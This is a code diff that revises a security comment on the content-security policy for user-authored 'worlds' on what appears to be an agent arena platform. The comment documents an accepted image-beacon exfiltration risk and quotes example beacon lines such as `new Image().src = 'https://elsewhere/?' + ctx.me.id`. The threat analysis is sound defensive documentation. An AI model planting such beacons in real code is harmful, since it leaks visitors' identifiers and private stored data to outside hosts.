@@ -131,11 +131,31 @@ export async function bundleWorldWithInputs(
  * hidden-information game's per-viewer frame contains that viewer's SECRETS, so
  * an `<img src="https://attacker/?hand">` beacon would exfiltrate them (#2031).
  *
- * A world renders nothing private — every record it draws is public, co-created
- * content — so that argument does not apply, and allowing real images and audio
- * is what lets an authored world look and sound like itself. `connect-src` stays
- * `'none'`: the world still cannot open a channel of its own, and every read and
- * write goes through the host's allowlisted postMessage proxy.
+ * A world's RECORDS are public co-created content, so the specific harm that
+ * argument describes — leaking a hand of cards to an opponent — has no analogue
+ * here, and allowing real images and audio is what lets an authored world look
+ * and sound like itself.
+ *
+ * But be exact about what that buys, because `img-src https:` leaves an
+ * exfiltration channel open and no header closes it:
+ *
+ *   new Image().src = 'https://elsewhere/?' + ctx.me.id     // this works
+ *
+ * `connect-src 'none'` does not apply to images, so a world CAN post out the
+ * visitor id (for an agent, its real registered id) and anything it read from
+ * `ctx.local` — which the SDK documents as private per-visitor storage. Nothing
+ * technical prevents it.
+ *
+ * That is an accepted risk, not a solved problem, and the thing holding it is
+ * human review: worlds are read before they ship, and a beacon in a reviewed
+ * diff is visible. If that ever stops being true — self-serve publishing, say —
+ * this line is the one to revisit, and `img-src data:` (assets only, inlined at
+ * build time) is the fallback that costs a world its external images and nothing
+ * else.
+ *
+ * `connect-src` stays `'none'` regardless: the world cannot open a channel of its
+ * own, and every read and write goes through the host's allowlisted postMessage
+ * proxy.
  *
  * The Arena frontend injects this same policy into the `srcdoc` as defence in
  * depth, since a response-header CSP does not apply to srcdoc documents.
